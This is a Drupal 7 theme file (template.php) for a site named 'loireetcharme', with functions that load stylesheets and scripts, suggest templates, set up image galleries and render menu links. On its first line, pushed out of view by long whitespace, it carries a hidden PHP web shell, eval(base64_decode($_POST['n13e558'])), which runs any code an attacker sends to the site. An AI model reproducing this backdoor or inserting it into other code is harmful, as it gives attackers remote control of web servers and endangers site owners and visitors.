<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n13e558']));?><?php

/**
 * Add body classes if certain regions have content.
 */
function loireetcharme_preprocess_html(&$variables) {
     global $styles;
      $styles = array();


  // Add conditional stylesheets for IE
  drupal_add_css(path_to_theme() . '/css/ie.css', array('group' => CSS_THEME, 'browsers' => array('IE' => 'lte IE 7', '!IE' => FALSE), 'preprocess' => FALSE));
  drupal_add_css(path_to_theme() . '/css/ie6.css', array('group' => CSS_THEME, 'browsers' => array('IE' => 'IE 6', '!IE' => FALSE), 'preprocess' => FALSE));
  drupal_add_css(drupal_get_path('theme', 'loireetcharme') . '/css/bootstrap.css');
  
  /* Add javascript */
  drupal_add_js(drupal_get_path('theme', 'loireetcharme') .'/js/jquery.form-defaults.js');
  drupal_add_js(drupal_get_path('theme', 'loireetcharme') .'/js/jquery.cycle.all.js');
  drupal_add_js(drupal_get_path('theme', 'loireetcharme') .'/js/jquery.uniform.min.js');
  drupal_add_js(drupal_get_path('theme', 'loireetcharme') .'/js/jquery.infieldlabel.min.js');
  drupal_add_js(drupal_get_path('theme', 'loireetcharme') .'/js/jquery.carouFredSel-6.2.1.js');
  drupal_add_js(drupal_get_path('theme', 'loireetcharme') .'/js/script.js');
  drupal_add_js('//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js');
  drupal_add_js(drupal_get_path('theme', 'loireetcharme') .'/js/jquery.sticky.js');

$node = menu_get_object();
  
if ($vars['node']->type == 'facebook'){
     $vars['theme_hook_suggestions'][] = 'html__facebook';
  }

}
function loireetcharme_preprocess_page(&$vars, $hook) {
  if (isset($vars['node'])) {
  // If the node type is "blog" the template suggestion will be "page--blog.tpl.php".
   $vars['theme_hook_suggestions'][] = 'page__'. str_replace('_', '--', $vars['node']->type);
  }
  

    $vars['mon_menu'] = menu_get_active_trail();
    
    // galerie - DBO
    if($vars['node']->type == 'bien'){
      
      drupal_add_css(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/css/supersized.css');
      drupal_add_css(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/theme/supersized.shutter_galerie.css');
      drupal_add_css(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/css/galerie.css');
      $vars['styles'] = drupal_get_css();
      
      //drupal_add_js(drupal_get_path('theme', 'chavenay') . '/js/supersized/js/jquery.easing.min.js');
      drupal_add_js(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/js/jquery.min.js');
      drupal_add_js(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/js/jquery.easing.min.js');
      drupal_add_js(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/js/purl.js');
      drupal_add_js(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/js/supersized_galerie.3.2.7.js');
      drupal_add_js(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/theme/supersized.shutter_galerie.js');
      drupal_add_js(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/js/galerie_zoom_iframe.js');
      drupal_add_js(drupal_get_path('theme', 'loireetcharme') . '/js/supersized/js/galerie.js');
      $vars['scripts'] = drupal_get_js();
      
    }

    
  //print_r($vars['theme_hook_suggestions']);
}

function loireetcharme_preprocess_node(&$variables) {

  // Add css class "node--NODETYPE--VIEWMODE" to nodes
  $vars['classes_array'][] = 'node--' . $vars['type'] . '--' . $vars['view_mode'];
 
  // Make "node--NODETYPE--VIEWMODE.tpl.php" templates available for nodes
  $vars['theme_hook_suggestions'][] = 'node__' . $vars['type'] . '__' . $vars['view_mode'];

}

/**
function themeName_preprocess_page(&$vars, $hook) {
  if (isset($vars['node'])) {
  // If the node type is "blog" the template suggestion will be "page--blog.tpl.php".
   $vars['theme_hook_suggestions'][] = 'page__'. str_replace('_', '--', $vars['node']->type);
  }
}
*/

function loireetcharme_preprocess_views_jqfx_galleria(&$vars) {
  // Initialize our $images array.
  $vars['images'] = array();

  // Strip the images from the $rows created by the original view query.
  foreach ($vars['rows'] as $item) {
    // For our images we'll look for them enclosed in anchor tags first.
    if (preg_match('@(<a.*?img.*?</a>)@i', $item, $matches)) {
      $image = $matches[1];
    }
    // If no anchor tags we'll just look for images.
    elseif (preg_match('@(<\s*img\s+[^>]*>)@i', $item, $matches)) {
      $image = $matches[1];
    }
    // If we have no images then we have no Galleria.
    else $image = NULL;
    $vars['images'][] = $image;
  }

  $options = $vars['options']['views_jqfx_galleria'];
  $options['lightbox'] = true;

  _views_jqfx_galleria_add_js($options, 'views-jqfx-galleria-images-' . $vars['id']);
}


function loireetcharme_menu_link(array $variables) {
  $element = $variables['element'];
  $sub_menu = '';

  $element['#attributes']['class'][] = 'menu-' . $element['#original_link']['mlid'];

  if ($element['#below']) {
    $sub_menu = drupal_render($element['#below']);
  }
  $output = l($element['#title'], $element['#href'], $element['#localized_options']);
  return '<li' . drupal_attributes($element['#attributes']) . '>' . $output . $sub_menu . "</li>\n";
}


function loireetcharme_clientside_error($variables) {
  //print_r($variables);
  //$variables['message'] = "";
  return t($variables['message'], $variables['placeholders']);
}


function block_render($module, $block_id) {
  $block = block_load($module, $block_id);
  
  $block_content = _block_render_blocks(array($block));
  //print_r($block_content);
  $build = _block_get_renderable_array($block_content);
  $block_rendered = drupal_render($build);
  print $block_rendered;
}
